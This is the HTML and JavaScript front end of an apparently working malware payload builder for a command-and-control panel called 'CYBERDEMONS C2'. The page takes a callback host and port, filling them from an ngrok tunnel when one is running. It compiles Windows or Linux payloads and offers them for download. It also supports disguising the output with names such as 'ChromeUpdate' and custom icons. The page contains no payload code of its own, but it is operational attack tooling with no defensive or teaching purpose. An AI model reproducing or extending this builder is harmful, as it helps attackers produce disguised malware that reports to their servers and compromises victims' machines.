<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="theme-color" content="#0a0a0f">
<title>Builder - CYBERDEMONS C2</title>
<style>
:root {
  --cyan: #00fff0; --magenta: #ff00ff; --green: #39ff14;
  --red: #ff0040; --bg: #0a0a0f; --surface: #0d0d1a;
  --card: #111122; --border: #1a1a3a; --dim: #6a6a8a; --bright: #e0e0ff;
}
* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
body {
  font-family: 'JetBrains Mono','Cascadia Code','Fira Code',monospace;
  background: var(--bg); color: var(--bright);
  min-height: 100vh; padding: 0 0 80px;
  position: relative;
}
body::before {
  content: ''; position: fixed; inset: 0;
  background: linear-gradient(rgba(0,255,240,.03) 1px,transparent 1px),
              linear-gradient(90deg,rgba(0,255,240,.03) 1px,transparent 1px);
  background-size: 40px 40px; pointer-events: none; z-index: 0;
}
.hdr {
  padding: 14px 16px; padding-top: max(14px,env(safe-area-inset-top,14px));
  background: var(--surface); border-bottom: 1px solid var(--border);
  display: flex; align-items: center; gap: 10px;
  position: sticky; top: 0; z-index: 10;
}
.hdr-logo { width:28px; height:28px; border-radius:50%; border:1px solid var(--cyan); flex-shrink:0; overflow:hidden; display:flex; align-items:center; justify-content:center; font-size:14px; color:var(--cyan); box-shadow:0 0 8px rgba(0,255,240,.2); }
.hdr-logo img { width:100%; height:100%; object-fit:cover; border-radius:50%; }
.hl { font-family: 'Orbitron',monospace; font-size: 16px; font-weight: 900; color: var(--cyan); letter-spacing: 2px; }
.hl span { color: var(--magenta); }
.hl small { font-size: 9px; color: var(--dim); font-family: 'JetBrains Mono',monospace; letter-spacing: 0; }
.bk { margin-left: auto; color: var(--dim); text-decoration: none; font-size: 11px; padding: 6px 10px; border: 1px solid var(--border); border-radius: 6px; }
.bk:active { border-color: var(--cyan); color: var(--cyan); }
.cnt { max-width: 500px; margin: 0 auto; padding: 12px 14px; position: relative; z-index: 1; }
.cd {
  background: var(--surface); border: 1px solid var(--border);
  border-radius: 12px; padding: 16px; margin-bottom: 12px;
  position: relative; overflow: hidden;
}
.cd::before { content: ''; position: absolute; top: -1px; left: 20%; right: 20%; height: 1px; background: linear-gradient(90deg,transparent,var(--cyan),transparent); opacity: .4; }
.ct { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: var(--dim); margin-bottom: 14px; font-weight: 700; }
.fg { margin-bottom: 12px; }
.fg label { display: block; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; color: var(--dim); margin-bottom: 4px; }
.fg input, .fg select {
  width: 100%; background: rgba(0,0,0,.4);
  border: 1px solid var(--border); border-radius: 8px;
  padding: 11px 14px; color: var(--bright);
  font-family: inherit; font-size: 14px; outline: none;
  transition: border-color .2s;
}
.fg input:focus, .fg select:focus { border-color: var(--cyan); }
.fg .hint { font-size: 9px; color: var(--dim); margin-top: 4px; }
.fr { display: flex; gap: 10px; }
.fr .fg { flex: 1; }
.btn {
  display: inline-flex; align-items: center; justify-content: center;
  padding: 12px 20px; border-radius: 8px; border: none;
  background: linear-gradient(135deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
  color: var(--bright); font-family: inherit;
  font-size: 12px; cursor: pointer; transition: all .2s;
  text-decoration: none; gap: 4px; font-weight: 700;
  box-shadow: 0 2px 8px rgba(0,0,0,.3);
}
.btn:active { transform: scale(.95); opacity: .8; }
.btn-c { background: linear-gradient(135deg,#00fff0,#009b94); color: #000; box-shadow: 0 0 16px rgba(0,255,240,.35); }
.btn-c:active { box-shadow: 0 0 24px rgba(0,255,240,.5); }
.btn-g { background: linear-gradient(135deg,#39ff14,#1a8a00); color: #000; box-shadow: 0 0 16px rgba(57,255,20,.35); }
.btn-g:active { box-shadow: 0 0 24px rgba(57,255,20,.5); }
.btn-fw { width: 100%; justify-content: center; }
.btn-sm { padding: 8px 14px; font-size: 10px; border-radius: 6px; }
.btn:disabled { opacity: .35; cursor: not-allowed; transform: none; box-shadow: none; }
.out {
  background: rgba(0,0,0,.5); border-radius: 8px; padding: 12px;
  font-size: 11px; line-height: 1.5; min-height: 50px;
  max-height: 180px; overflow-y: auto; white-space: pre-wrap;
  word-break: break-all; color: var(--green); margin-top: 10px;
}
.out::-webkit-scrollbar { width: 3px; }
.out::-webkit-scrollbar-thumb { background: var(--cyan); border-radius: 2px; }
.sb {
  display: flex; align-items: center; gap: 6px; margin-top: 8px; font-size: 10px; color: var(--dim);
}
.sb .dot { width: 7px; height: 7px; border-radius: 50%; }
.sb .dot.idle { background: var(--dim); }
.sb .dot.run { background: var(--yellow); animation: pl 1s infinite; }
.sb .dot.ok { background: var(--green); box-shadow: 0 0 6px var(--green); }
.sb .dot.fail { background: var(--red); }
@keyframes pl { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
.st { margin-left: auto; color: var(--red); border-color: var(--red); }
.st:active { background: rgba(255,0,64,.1); }
body.has-bg::before { display: none; }
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-logo" id="hdrLogoEl">&#9881;</div>
  <div class="hl"><span>BUILDER</span> <small>v2.0</small></div>
  <a href="/" class="bk">&#8592; C2</a>
</div>

<div class="cnt">
  <div class="cd">
    <div class="ct">&#128279; C2 Connection</div>
    <div class="fr">
      <div class="fg">
        <label>Host / IP</label>
        <input type="text" id="bhost" placeholder="e.g. 192.168.1.100">
      </div>
      <div class="fg" style="flex:0 0 100px;">
        <label>Port</label>
        <input type="number" id="bport" placeholder="7777">
      </div>
    </div>
    <button class="btn btn-c btn-fw" onclick="saveCfg()" id="saveBtn">Save Config</button>
    <div class="sb"><span class="dot idle" id="cfgDot"></span><span id="cfgStat">Loaded</span></div>
  </div>

  <div class="cd">
    <div class="ct">&#9881; Payload Options</div>
    <div class="fg">
      <label>Platform</label>
      <select id="bplat" onchange="updPrev()">
        <option value="windows">Windows (.exe)</option>
        <option value="linux">Linux (ELF)</option>
      </select>
    </div>
    <div class="fg">
      <label>Filename</label>
      <input type="text" id="bname" value="payload" placeholder="e.g. ChromeUpdate" oninput="updPrev()">
      <div class="hint">Output: <strong id="prevOut" style="color:var(--cyan);">payload.exe</strong></div>
    </div>
    <div class="fg" id="iconGroup">
      <label>Custom Icon (.ico)</label>
      <input type="file" id="iconFile" accept=".ico" style="padding:8px;font-size:12px;">
      <div class="hint">Current: <span id="curIcon">app.ico</span></div>
    </div>
    <button class="btn btn-c btn-sm" onclick="upIcon()">Upload Icon</button>
    <span id="iconStat" style="color:var(--green);font-size:10px;margin-left:8px;display:none;">Done</span>
  </div>

  <div class="cd">
    <div class="ct">&#9881; Compile</div>
    <button class="btn btn-c btn-fw" onclick="startBuild()" id="buildBtn">Build Payload</button>
    <a class="btn btn-g btn-fw" id="dlBtn" style="display:none;margin-top:8px;" href="#">&#8595; Download</a>
    <div class="out" id="buildOut">Ready. Configure and build.</div>
    <div class="sb"><span class="dot idle" id="buildDot"></span><span id="buildStat">Idle</span></div>
  </div>
</div>

<script>
async function api(url,opts){try{const r=await fetch(url,opts);return await r.json()}catch{return null}}

async function loadCfg(){
  const d=await api('/api/builder/config');
  if(d){document.getElementById('bhost').value=d.host||'';document.getElementById('bport').value=d.port||'';document.getElementById('curIcon').textContent=d.current_icon||'app.ico';}
  // auto-fill from ngrok if running
  const ng=await api('/api/ngrok/status');
  if(ng&&ng.running&&ng.host){document.getElementById('bhost').value=ng.host;document.getElementById('bport').value=ng.port;}
}
loadCfg();

function updPrev(){
  const n=document.getElementById('bname').value.trim()||'payload';
  const p=document.getElementById('bplat').value;
  document.getElementById('prevOut').textContent=n+(p==='linux'?'.elf':'.exe');
  const ig=document.getElementById('iconGroup');
  ig.style.opacity=p==='linux'?'.4':'1';
  document.getElementById('iconFile').disabled=p==='linux';
}

async function saveCfg(){
  const h=document.getElementById('bhost').value.trim(),p=document.getElementById('bport').value;
  const btn=document.getElementById('saveBtn');btn.disabled=true;btn.textContent='Saving...';
  const d=await api('/api/builder/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:h,port:parseInt(p)})});
  btn.disabled=false;btn.textContent='Save Config';
  const st=document.getElementById('cfgStat'),dot=document.getElementById('cfgDot');
  if(d&&d.saved){st.textContent=`Saved: ${d.host}:${d.port}`;dot.className='dot ok';}
  else{st.textContent='Error';dot.className='dot fail';}
}

async function upIcon(){
  const fi=document.getElementById('iconFile');
  if(!fi.files.length){alert('Select a .ico file');return;}
  const fd=new FormData();fd.append('icon',fi.files[0]);
  const d=await api('/api/builder/icon',{method:'POST',body:fd});
  if(d&&d.saved){document.getElementById('iconStat').style.display='inline';document.getElementById('curIcon').textContent=d.icon;}
  else alert('Upload failed');
}

let bp=null;
async function startBuild(){
  const h=document.getElementById('bhost').value.trim(),p=document.getElementById('bport').value;
  const plat=document.getElementById('bplat').value,n=document.getElementById('bname').value.trim()||'payload';
  await api('/api/builder/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:h,port:parseInt(p)})});
  const btn=document.getElementById('buildBtn');btn.disabled=true;btn.textContent='Building...';
  document.getElementById('dlBtn').style.display='none';
  document.getElementById('buildOut').textContent=`Building ${n} (${plat})...`;
  const r=await api('/api/builder/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({app_name:n,platform:plat})});
  if(r&&r.error){document.getElementById('buildOut').textContent=r.error;btn.disabled=false;btn.textContent='Build Payload';return;}
  bp=setInterval(async()=>{
    const s=await api('/api/builder/status');if(!s)return;
    if(s.running){document.getElementById('buildOut').textContent='Compiling...';return;}
    clearInterval(bp);bp=null;btn.disabled=false;btn.textContent='Build Payload';
    const o=document.getElementById('buildOut'),dot=document.getElementById('buildDot'),st=document.getElementById('buildStat');
    if(s.success){
      dot.className='dot ok';st.textContent='Build OK';
      o.innerHTML=`Build succeeded. <a href="/api/builder/download" style="color:var(--cyan);">Download ${s.exe_name||'payload'}</a>`;
      document.getElementById('dlBtn').style.display='flex';document.getElementById('dlBtn').href='/api/builder/download';
    } else {
      dot.className='dot fail';st.textContent='Build failed';o.textContent=s.last_output||'Error';
    }
  },1000);
}

// bg + logo
async function loadAssets(){
  const d=await api('/api/settings');if(!d)return;
  if(d.bg){document.body.style.backgroundImage=`url(${d.bg}?t=${Date.now()})`;document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.style.backgroundAttachment='fixed';document.body.classList.add('has-bg');}
  if(d.logo){document.getElementById('hdrLogoEl').innerHTML=`<img src="${d.logo}?t=${Date.now()}" alt="logo">`;}
}
loadAssets();
</script>
</body>
</html>
